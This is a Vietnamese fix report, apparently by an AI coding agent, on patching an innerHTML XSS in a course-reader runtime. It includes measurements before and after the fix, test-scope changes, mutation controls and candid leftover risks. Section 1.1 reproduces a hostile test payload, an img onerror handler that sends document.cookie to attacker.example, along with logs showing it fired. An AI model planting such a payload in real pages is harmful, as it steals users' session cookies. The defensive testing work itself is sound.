# Fix C1 — gói hạng `content` chạy được mã tuỳ ý qua `data-viz`

**Nhánh:** `worktree-agent-ab79e590321d37172`
**Tệp đổi:** `packages/course-kit/runtime.js`, `apps/web/src/db/local.test.ts` (+230/−30)

---

## 0. Tóm tắt một đoạn

Lỗ hổng đã đóng và **đo được là về 0** trên Chromium thật, trên **origin `http://` thật** (không
phải `page.setContent`) — nên phép đo này còn cho thấy **một điều người thẩm định không đo được:
request exfil THẬT SỰ RỜI trình duyệt** ở trạng thái trước khi sửa. Bốn sink `innerHTML` trong
`runtime.js` còn **hai**, và hai cái còn lại được cho phép bằng **lập luận về tính với-tới-được đã
đo**, không phải bằng lời khẳng định. Hàng rào `innerHTML` được đóng khung lại **theo lớp** —
*"mọi tệp bên thứ nhất chạy trong trang của người đọc"* — và bây giờ **thất bại ồn ào nếu bất kỳ
gốc quét nào cho ra 0 tệp**. Năm phép đối chứng hai chiều, tất cả đúng chiều. Sáu cổng chạy thật,
tất cả exit 0.

---

## 1. Việc 1 — bịt sink

### 1.1 Phép đo TRƯỚC (tái hiện đầy đủ phép đo của người thẩm định)

Gói thù địch (`scratchpad/c1/hostile/`) khai `tier: "content"`, đọc như văn xuôi bình thường,
chương một chứa đúng một dòng đáng ngờ:

```html
<div data-viz="&lt;img src=x onerror=&quot;window.__PWNED=(window.__PWNED||0)+1;fetch('https://attacker.example/?c='+document.cookie)&quot;&gt;"></div>
```

**Cổng 1 — `tuhoc pack`** (lệnh người đóng góp chạy trước khi mở PR):

```
tuhoc pack: OK — 3 tệp, 1.0 KB → …/hostile.zip
RAW_EXIT_TUHOC_PACK=0
```

**Cổng 2 — bộ luật dùng chung, chạy trên chính bytes của zip vừa ghi:**

```
files in zip : chapters/c1.html, chapters/c2.html, manifest.json
ok           = true
findings     = []
RAW_EXIT_VALIDATE=0
```

**Cổng 3/4 — Chromium THẬT**, đường render thật (`ChapterView.tsx:335` → `:347`), tài liệu SỐNG,
phục vụ từ một **origin `http://127.0.0.1` thật** thay vì `page.setContent`:

```
CHROMIUM[BEFORE]  origin                        : http://127.0.0.1:58337
CHROMIUM[BEFORE]  CourseKit.VIZ size            : 0
CHROMIUM[BEFORE]  img after innerHTML           : 0
CHROMIUM[BEFORE]  img after CourseKit.initViz   : 1
CHROMIUM[BEFORE]  typeof img.onerror            : function
CHROMIUM[BEFORE]  img onerror attribute         : window.__PWNED=(window.__PWNED||0)+1;fetch('https://attacker.example/?c='+document.cookie)
CHROMIUM[BEFORE]  LIVE document                 : true   attached to page: true
CHROMIUM[BEFORE]  handler ACTUALLY RAN (count)  : 1
CHROMIUM[BEFORE]  exfil requests to attacker    : 1     <-- MỚI so với phép đo của người thẩm định
```

> **Ghi chú trung thực của người thẩm định đã được đóng lại.** Họ ghi rằng request tới
> `attacker.example` **không rời trình duyệt** trong phép đo của họ (`0`), vì `page.setContent`
> cho trang một origin mờ. Tôi phục vụ trang qua một HTTP server thật và bắt request bằng
> `page.route` (chạy TRƯỚC mạng, nên DNS hỏng cũng vẫn đếm được): **1 request**. Nghĩa là chuỗi
> hệ quả họ *suy ra* — same-origin `fetch` kèm cookie phiên — có thêm một mắt xích được **đo**,
> không phải suy.

### 1.2 Phép sửa

`packages/course-kit/runtime.js` — `initViz` không còn dựng markup bằng nối chuỗi. Hai thông báo
đi qua một hàm dựng **node**, và phần do gói kiểm soát được đặt bằng **`textContent`**:

```js
function vizNotice(node, cls, style, message){
  node.textContent = '';
  node.appendChild(el('div', {class: cls, style: style, text: message}));
}
```

`el(…, {text})` gán `textContent`; `el(…, {html})` gán `innerHTML` — **lựa chọn khoá chính là toàn
bộ phép sửa**, và nó được ghi thành chú thích ngay tại chỗ.

**Soát hết tệp, không chỉ dòng 340.** Người thẩm định đếm **4 sink `innerHTML`** (dòng 10, 250,
340, 344). Sau phép sửa:

| dòng cũ | sink | trạng thái |
|---|---|---|
| 340 | `node.innerHTML = '…"'+name+'"…'` | **XOÁ** — đây là C1. `name` = `data-viz`, do gói kiểm soát |
| 344 | `node.innerHTML = '<div …>Không dựng được…'` | **XOÁ** — chuỗi hằng, nhưng vẫn là sink; không có lý do giữ |
| 10 | `el(tag,{html})` → `e.innerHTML` | **GIỮ**, có allowlist + lý do đo được |
| 250 | `Plot#showTip` → `this.tipEl.innerHTML` | **GIỮ**, cùng lý do |

**Lý do giữ hai cái còn lại là một khẳng định về TÍNH VỚI-TỚI-ĐƯỢC, và nó đã được ĐO** (đúng kỷ
luật S1-F30: chú thích khẳng định thuộc tính an ninh phải được kiểm):

1. Nơi **duy nhất** trong `runtime.js` đọc **dữ liệu do gói viết** là `initViz`, và dữ liệu duy
   nhất nó đọc là `node.dataset.viz`. Đo: `grep -n "dataset\|getAttribute" runtime.js` → chỉ
   337/338/341, không còn gì khác. Đường đó **giờ kết thúc ở `textContent`**.
2. Mọi thứ nạp vào hai sink còn lại (`readout`, `button`, thân tooltip) được gọi **bởi `viz.js`
   của course**, và `viz.js` chỉ nạp cho `tier: "interactive"`.
3. Gói `content` **không thể** với tới, vì với tới đòi phải chạy JavaScript. **Đo, không suy** —
   thêm `viz.js` vào chính gói `content` thù địch rồi đóng gói lại:

```
1) JS_FILE_IN_PACKAGE
   vị trí: viz.js
   vấn đề: tier "content" must not ship JavaScript files
RAW_EXIT_PACK_CONTENT_WITH_JS=1
```

4. Gói `interactive` với tới được và **không nhận thêm quyền gì**: nó đã chạy mã của chính nó
   trong trang này, có chủ đích (spec §1.2).

### 1.3 Phép đo SAU — cùng gói, cùng harness, cùng origin thật

```
CHROMIUM[AFTER-FINAL]  CourseKit.VIZ size            : 0
CHROMIUM[AFTER-FINAL]  img after innerHTML           : 0
CHROMIUM[AFTER-FINAL]  img after CourseKit.initViz   : 0
CHROMIUM[AFTER-FINAL]  typeof img.onerror            : no <img> at all
CHROMIUM[AFTER-FINAL]  LIVE document                 : true   attached to page: true
CHROMIUM[AFTER-FINAL]  handler ACTUALLY RAN (count)  : 0
CHROMIUM[AFTER-FINAL]  exfil requests to attacker    : 0
CHROMIUM[AFTER-FINAL]  hostile node textContent      : "[mô phỏng \"<img src=x onerror=\"window.__PWNED=…"
```

Dòng cuối là điểm cần nhìn: payload **vẫn hiển thị**, đúng nguyên văn, **như VĂN BẢN**. Nó không
bị nuốt, không bị sửa, không bị "làm sạch" — nó chỉ thôi là markup.

### 1.4 Ràng buộc "tên lành vẫn hiện đúng" — đo hai chiều

Một node `data-viz="entropy-curve"` (tên lành), cùng harness, TRƯỚC và SAU:

```
BEFORE  benign notice innerHTML : "<div class=\"small muted\" style=\"padding:20px;font-family:var(--sans)\">[mô phỏng \"entropy-curve\" chưa sẵn sàng]</div>"
AFTER   benign notice innerHTML : "<div class=\"small muted\" style=\"padding:20px;font-family:var(--sans)\">[mô phỏng \"entropy-curve\" chưa sẵn sàng]</div>"
```

**Giống nhau đến từng byte.** Thông báo không đổi hình dạng, chỉ đổi cách được dựng.

---

## 2. Việc 2 — mở rộng thẩm quyền của hàng rào

### 2.1 Thẩm quyền cũ và vì sao nó im lặng

`apps/web/src/db/local.test.ts` — bài test tự đặt tên **"is looking at the whole app"**, thẩm quyền
thật là `appSourceFiles()`: **một thư mục (`apps/web/src`) và hai đuôi tệp (`.ts`/`.tsx`)**.
`packages/course-kit/runtime.js` trượt cả hai.

Phần loại trừ được viết bằng chữ, **tiền đề đúng nhưng không liên quan**: *"it never sees a manifest
field"*. Đúng — và lạc đề, vì dòng 340 đụng **trường của CHƯƠNG**. Luật bị đóng khung là *"không
trường manifest thành markup"* thay vì lớp mà cả hai thuộc về.

### 2.2 Đóng khung lại

Luật, viết ngay trong tệp:

> **KHÔNG DỮ LIỆU NÀO DO GÓI KIỂM SOÁT ĐƯỢC TRỞ THÀNH MARKUP TRONG MÃ CHÚNG TA SHIP.**

Thẩm quyền, viết theo **lớp** chứ không theo hình dạng đường dẫn: **mọi tệp BÊN THỨ NHẤT chạy bên
trong trang của người đọc**, bất kể thư mục và bất kể đuôi tệp. Cấu trúc dữ liệu mới là
`BROWSER_CODE_ROOTS`, mỗi gốc mang tên, hàm quét, và **lý do vì sao mã ở đó chạy trong trang người
đọc**.

`describe`/`it` đã đổi tên cho khớp thẩm quyền thật:

| | cũ | mới |
|---|---|---|
| `describe` | *"a manifest field is text, never markup"* | *"no package-controlled data becomes markup in code we ship to the reader"* |
| `it` | *"is looking at the whole app, and at the one sink it allows"* | *"scans every root of first-party reader-page code, and goes red if any root scans nothing"* |
| `it` | *"…no manifest string can become markup"* | *"…no package-controlled string can become markup"* |

### 2.3 Hàng rào mới quét BAO NHIÊU tệp — con số

```
CŨ  thẩm quyền  apps/web/src/**/*.ts(x) không-test        : 49 tệp
MỚI gốc 1       apps/web/src/**/*.ts(x) không-test        : 49 tệp
MỚI gốc 2       packages/course-kit/**/*.js (trừ vendor/) :  1 tệp  -> packages/course-kit/runtime.js
MỚI thêm        apps/web/index.html <script> nội tuyến    :  1 khối
MỚI TỔNG đơn vị được quét                                 : 51
```

**Vì sao có khối `<script>` nội tuyến trong danh sách:** `apps/web/index.html` mang đoạn bootstrap
theme chạy đồng bộ trước mọi thứ khác. Nó là mã bên thứ nhất, chạy trong trang người đọc, và nằm
trong một tệp **không mang cả hai đuôi mà thẩm quyền cũ chấp nhận** — đúng loại thứ mà luật
"thư-mục-và-đuôi-tệp" không thể thấy còn luật theo LỚP thì phải thấy. Thân `<script>` (không có
`src`) được trích ra và đưa qua đúng bộ quét AST.

**Cái gì CỐ Ý nằm ngoài thẩm quyền, và đây là phân biệt thật chứ không phải tai nạn đường dẫn:**

```
NGOÀI thẩm quyền có chủ đích  courses/**/*.js : 2 tệp -> courses/***REMOVED***/viz.js, courses/so-dau-phay-dong/viz.js
```

`viz.js` **không phải mã chúng ta ship** — nó là **payload**, và `tier: "interactive"` tồn tại
chính xác để cho phép gói chạy mã (spec §1.2). Báo `innerHTML` của nó sẽ tạo ra vi phạm **không có
cách sửa đúng** — đúng lỗi phân loại mà ruling S1-F8 từ chối mắc. Cái cai quản payload là cổng
`tier` + bộ luật; cái cai quản **mã của chúng ta** là hàng rào này.

### 2.4 Chốt tự kiểm: thất bại ồn ào nếu quét 0 tệp

Kiểm **theo từng gốc**, không phải một ngưỡng tổng:

```ts
for (const root of BROWSER_CODE_ROOTS) {
  const count = root.files().length;
  expect(count, `${root.name} scanned 0 files — this scan is now blind there (${root.why})`).toBeGreaterThan(0);
}
expect(inlineShellScripts().length, 'no inline <script> found in the app shell').toBeGreaterThan(0);
expect(seen).toContain(join('packages', 'course-kit', 'runtime.js'));
```

Ngưỡng tổng **không đủ**, và lý do là chính trạng thái mà C1 đã ship: `apps/web/src` một mình vượt
mọi ngưỡng tổng trong khi `packages/course-kit` im lặng đóng góp **0**. Thêm nữa, `runtime.js` được
**gọi thẳng tên** — đổi tên hay dời tệp phải mở lại lập luận, không được lặng lẽ rơi ra khỏi phạm
vi.

---

## 3. Đối chứng hai chiều (5 phép, tất cả đúng chiều)

Chạy bằng `scratchpad/c1/controls.py`. Mọi phép chạm tệp **được git theo dõi** đều nằm trong
`try/finally` của **MỘT tiến trình**, có `shasum` trước/sau và `git status --porcelain` ở cuối
(ruling S1-F9). Hai phép còn lại không chạm tệp được theo dõi.

| # | phép | kỳ vọng | exit | kết quả |
|---|---|---|---|---|
| 0 | cây như đã commit | XANH | 0 | OK |
| 1 | **mutant: đưa `innerHTML` trở lại `runtime.js`** | ĐỎ | 1 | OK |
| 2 | sửa đổi vô hại (chỉ thêm comment vào `runtime.js`) | XANH | 0 | OK |
| 3 | mutant: **tệp `.js` bên thứ nhất MỚI** có sink | ĐỎ | 1 | OK |
| 4 | mutant cổng mù: một gốc quét trỏ vào thư mục không tồn tại | ĐỎ | 1 | OK |

Thông điệp thật của #1:

```
packages/course-kit/runtime.js uses innerHTML 3× (expected 2: two markup affordances for `viz.js`
(el({html}), Plot#showTip) — reachable only by executing package code, i.e. only by
`tier: "interactive"`, which already runs its own code by design)
```

Thông điệp thật của #3 — chứng minh thẩm quyền phủ **lớp**, không phải một tệp được gọi tên:

```
packages/course-kit/intruder.js turns a string into markup via innerHTML — this code runs in the
reader's page, where a stranger's package supplies the manifest AND every chapter attribute, and
neither is scanned for markup by the rule set (ruling S1-F8 reads start tags only); build a node
and assign textContent instead
```

Thông điệp thật của #4 — chốt cổng mù nổ đúng chỗ:

```
AssertionError: packages/course-kit/**/*.js (minus vendor/) scanned 0 files — this scan is now
blind there (the reader runtime, loaded as a classic <script src> on every reader route …):
expected 0 to be greater than 0
```

`shasum` hai chiều cho #1 và #2:

```
#1  BEFORE 3868a7f6…  MUTATED ccd53076…  AFTER 3868a7f6… MATCH
#2  BEFORE 3868a7f6…  MUTATED ccdddacc…  AFTER 3868a7f6… MATCH
git status --porcelain sau khi chạy xong:
 M apps/web/src/db/local.test.ts
 M packages/course-kit/runtime.js      <- đúng hai tệp của task này, không mutant nào sống sót
```

---

## 4. Cổng — mã thoát thô, lấy từ chính lệnh cần đo

| cổng | lệnh | mã thoát | ghi chú |
|---|---|---|---|
| `test-web` | `rtk proxy make test-web` | **0** | 42 tệp test, **743 test** xanh |
| `test-format` | `rtk proxy make test-format` | **0** | `tsc -b` + vitest |
| `test-cli` | `rtk proxy make test-cli` | **0** | `tsc -b` + vitest |
| type-gate web | `bunx tsc -b` (trong `apps/web`) | **0** | |
| `test-e2e` | `rtk proxy make test-e2e` | **0** | **11 test Playwright**, `playwright test exit=0` |
| hàng rào riêng | `bunx vitest run src/db/local.test.ts` | **0** | 28 test |

**Ràng buộc "không được làm hỏng `viz.js` hợp lệ" — đo được, không suy:**

```
✓  11 [chromium] › e2e/viz.spec.ts:117:3 › every visualization runs in the new reader
   (spec §10 exit gate) › every registered viz renders in the reader and produces no
   console errors (4.8s)
11 passed (2.0m)
playwright test exit=0
```

**Dọn tiến trình nền (S1-F27):** `docker ps` ngay sau `test-e2e` — **0 container `tuhoc-*` còn
sống**; các container còn lại (`af-review-pg`, `github-mcp-server`, `evn-mock-server`) đã có từ
trước và không thuộc phiên này. `scripts/test-e2e.sh` tự tháo stack ở cả hai nhánh thắng/thua.

**Kỷ luật đo đã theo:** mọi lệnh đo dùng `/bin/cat` · `/usr/bin/grep` · `/usr/bin/git` ·
`rtk proxy make …`, in `RAW_EXIT_*` **của chính lệnh cần đo** (không lấy cuối pipeline), sửa tệp
bằng **Python** (không `perl`), và không dùng `vitest --reporter=basic`.

---

## 5. CSP — CỐ Ý không làm trong task này, ghi lại làm việc tiếp theo

Không thêm CSP, theo đúng ràng buộc của brief. Nó là **lớp phòng thủ độc lập** với validator, và nó
**đụng hạng `interactive`**: `viz.js` được nạp bằng **blob URL** (`course/loader.ts:vizBlobUrl`),
nên `script-src 'self'` một mình sẽ **giết hạng `interactive`**; chính sách phải là `script-src
'self' blob:`, và `blob:` lại nới đúng cửa mà CSP định đóng. Đó là một quyết định thiết kế riêng,
cần phạm vi riêng và cần phép đo riêng trên `viz.spec.ts`.

Điều còn đúng nguyên: **hiện không có CSP ở bất kỳ đâu** (`index.html`, `apps/web/public/`,
`render.yaml`, `apps/api`, `vite.config.ts`), nên bất kỳ khe hở nào của validator vẫn là
RCE-trong-trình-duyệt trọn vẹn. **B là bổ sung cho A, không thay thế A** — và A giờ đã xong.

---

## 6. Mối lo tôi kém chắc chắn nhất

**Allowlist đếm SỐ LẦN, nên nó không phân biệt được "sink nào".**

Mục mới cho `runtime.js` nói `times: 2`. Nếu ai đó **xoá** `innerHTML` của `Plot#showTip` và
**thêm** một `innerHTML` mới ở chỗ khác trong cùng tệp — tổng vẫn là 2 — **hàng rào vẫn XANH**. Nó
bắt được *thêm* sink (đối chứng #1 chứng minh), bắt được *tệp mới* có sink (đối chứng #3), bắt được
*gốc quét chết* (đối chứng #4), nhưng **không bắt được HOÁN ĐỔI**.

Đây không phải khuyết tật tôi tạo ra — hai mục cũ (`ChapterView.tsx`, `version.ts`) mang đúng hình
dạng ấy từ đầu — nhưng nó **tệ hơn ở `runtime.js`**, vì hai lý do:

1. `runtime.js` là tệp **duy nhất** trong thẩm quyền có **nhiều hơn một** sink được phép, nên nó là
   tệp duy nhất có chỗ để hoán đổi.
2. `runtime.js` có **0 tệp test của riêng nó** (`find packages/course-kit -name '*test*'` → 0). Với
   `ChapterView.tsx` và `version.ts`, một sink bị đổi chỗ sẽ đập vào các test hành vi khác. Ở
   `runtime.js` thì **không có gì khác nhìn**.

Tôi cân nhắc nâng allowlist thành "sink nằm trong hàm nào" (`el`, `showTip`) rồi bỏ, vì
`htmlSinksUsedIn` hiện chỉ trả về **tên sink**, và mở rộng nó để mang theo ngữ cảnh hàm bao là một
thay đổi thật cho một dụng cụ mà **cả hai** scan trong tệp này dùng chung — tôi không muốn đổi hình
dạng dụng cụ trong cùng commit vá một lỗ Critical. **Tôi ghi nó ra thay vì lặng lẽ chấp nhận**, và
đề nghị đó là việc tiếp theo cho khu vực này, cùng với việc `packages/course-kit` xứng đáng có test
riêng.

**Mối lo thứ hai, nhỏ hơn, cũng ghi ra:** lập luận cho hai sink còn lại là lập luận **với-tới-được**,
và nó đứng trên `resolveVizScriptUrl` + `JS_FILE_IN_PACKAGE`. Tôi đã **đo** cả hai (mục §1.2). Nhưng
`resolveVizScriptUrl:533` có một nhánh tôi **không** đo: gói **không** nằm trong `db.packages` thì
nó trả `/courses/<id>/viz.js` **vô điều kiện, không đọc `tier`**. Đó là đường phục vụ thư mục làm
việc `courses/` của `vite dev`, không phải đường import — nên nó không thuộc C1 — nhưng nó là một
chỗ nữa mà nhãn `tier` **không** được đọc, và tôi để lại nguyên trạng. Nếu sau này có ai cho phép
phục vụ `courses/` từ nội dung do người dùng nạp, nhánh đó phải được kiểm lại trước.

---

## 7. Tệp đã đổi

- `packages/course-kit/runtime.js` — `vizNotice()` mới; `initViz` không còn nối chuỗi vào
  `innerHTML`; chú thích tại chỗ cho hai sink còn lại (`el`'s `{html}`, `Plot#showTip`) nêu rõ đó là
  khẳng định **với-tới-được** và **cái gì sẽ làm khẳng định đó sai**.
- `apps/web/src/db/local.test.ts` — `jsFilesUnder()` tách ra dùng chung; `BROWSER_CODE_ROOTS` +
  `browserCodeFiles()` + `inlineShellScripts()`; mục allowlist cho `runtime.js` (`times: 2`) kèm
  lập luận và điều kiện phá vỡ; chốt tự kiểm 0-tệp theo từng gốc; đổi tên `describe`/`it` và thông
  điệp vi phạm cho khớp thẩm quyền thật; gỡ bỏ đoạn loại trừ *"it never sees a manifest field"*.

---

## 8. Ghi chú về vị trí báo cáo

`.superpowers/` **không được git theo dõi** trong repo này (`git ls-files .superpowers` rỗng,
`git check-ignore` cũng không khớp — nó chỉ là thư mục làm việc của điều phối viên trong bản
checkout chính). Worktree của tôi không có sẵn nó, và tôi bị chặn ghi ra ngoài worktree, nên báo
cáo này được ghi **trong worktree** tại đúng đường dẫn được yêu cầu và **được commit cùng phép sửa**.
Điều phối viên có thể chép nó về `.superpowers/` của bản checkout chính khi gộp, hoặc bỏ nó khỏi
commit nếu muốn giữ `.superpowers/` untracked như trước.
